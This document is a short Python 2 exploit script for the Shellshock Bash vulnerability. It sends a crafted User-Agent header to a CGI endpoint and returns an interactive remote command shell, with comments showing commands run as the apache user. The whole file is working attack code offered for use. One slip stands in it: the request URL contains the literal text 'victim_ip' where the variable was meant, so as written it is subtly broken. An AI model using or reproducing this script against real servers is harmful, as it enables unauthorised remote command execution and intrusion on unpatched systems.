#!/usr/bin/python

# python shellshock_shell.py 192.168.56.1
# $ id
# uid=48(apache) gid=48(apache) groups=48(apache)
# $ pwd
# /var/www/cgi-bin

import requests, sys
from base64 import b64encode

victim_ip = sys.argv[1]

while True:
    command = b64encode(raw_input('$ ').strip())
    headers = {
        'User-Agent': '() { :; }; echo \'Content-type: text/html\'; echo; export PATH=$PATH:/usr/bin:/bin:/sbin; echo \'%s\' | base64 -d | sh 2>&1' % command
    }

    print requests.get('http://victim_ip/cgi-bin/cat', headers=headers).text.strip()